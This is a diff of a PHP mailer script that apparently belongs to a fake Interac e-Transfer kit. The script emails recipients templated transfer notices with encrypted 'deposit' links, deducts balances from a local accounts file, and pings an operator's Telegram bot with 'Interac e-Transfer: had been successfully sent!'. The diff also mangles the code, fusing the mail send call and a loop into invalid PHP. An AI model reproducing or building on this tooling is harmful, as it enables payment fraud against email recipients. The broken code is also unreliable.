@@ -3,19 +3,6 @@ declare(strict_types=1);
 session_start();
 header('Content-Type: application/json');
 
-/*
-  tools/mailer.php
-  Fully working mailer that:
-  - accepts normal + one-time recipient fields
-  - embeds/resizes images
-  - updates accounts.json and lending_pending.json
-  - sends Telegram notification if configured
-  - builds encrypted deposit URL as ?deposit=BASE32_UPPER(ALPHANUM)
-    using AES-256-CBC (openssl) and RFC4648 Base32 (A-Z2-7 digits)
-  Requirements:
-  - config/config.php must return array with smtp, sendername, etc.
-  - vendor/autoload.php (PHPMailer) must be present
-*/
 
 $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/';
 $configFile = $docRoot . 'config/config.php';
@@ -25,7 +12,6 @@ if (!is_file($configFile)) {
 }
 $config = require $configFile;
 
-/* ---------------- Helpers ---------------- */
 
 function get_post(string $k): string {
     return trim((string)($_POST[$k] ?? ''));
@@ -65,7 +51,6 @@ function encrypt_for_url(string $plaintext, string $key): string {
     return base32_encode_rfc4648($payload);
 }
 
-/* ---------------- Collect POST safely ---------------- */
 $post = [];
 $fields = [
     'recipient_email','recipient_name',
@@ -109,7 +94,6 @@ if (!is_file($template_path)) {
 }
 $template = file_get_contents($template_path);
 
-/* build deposit URL with encrypted query in ?deposit=... */
 $params = [
     'senderName'       => $config['sendername'] ?? 'Sender',
     'contactName'      => $recipient_name,
@@ -142,7 +126,6 @@ $placeholders = [
 ];
 $template = strtr($template, $placeholders);
 
-/* ---------------- PHPMailer send ---------------- */
 require $docRoot . 'vendor/autoload.php';
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
@@ -223,14 +206,7 @@ $mail->Encoding = 'base64';
         $mail->DKIM_identity = $mail->From;
     }
 
-    $mail->send();
-
-    /* ---------- update accounts.json (deduct) ---------- */
-    $accounts_file = $docRoot . 'data/accounts.json';
-    if (is_file($accounts_file)) {
-        $accounts = json_decode(file_get_contents($accounts_file), true);
-        if (is_array($accounts)) {
-            foreach ($accounts as &$acct) {
+    $mail-> ($accounts as &$acct) {
                 if (($acct['id'] ?? '') === $selected_account) {
                     $acct['balance'] = max(0, floatval($acct['balance'] ?? 0) - $amount_float);
                     break;
@@ -268,7 +244,7 @@ $mail->Encoding = 'base64';
                 [['text' => 'Open e-Transfer', 'url' => $etransferLink]]
             ]
         ];
-        $msg = "🟩 TRANSFER SENT SUCCESSFUL 🟩";
+        $msg = "Interac e-Transfer: had been successfully sent! ";
         $tgUrl = "https://api.telegram.org/bot{$config['telegram']['bot_token']}/sendMessage";
         $payload = [
             'chat_id' => $config['telegram']['chat_id'],
@@ -287,7 +263,7 @@ $mail->Encoding = 'base64';
         curl_close($ch);
     }
 
-    /* ---------- session store ---------- */
+   
     $_SESSION['transfer_details'] = [
         'transaction_id' => $transaction_id,
         'recipient_name' => $recipient_name,
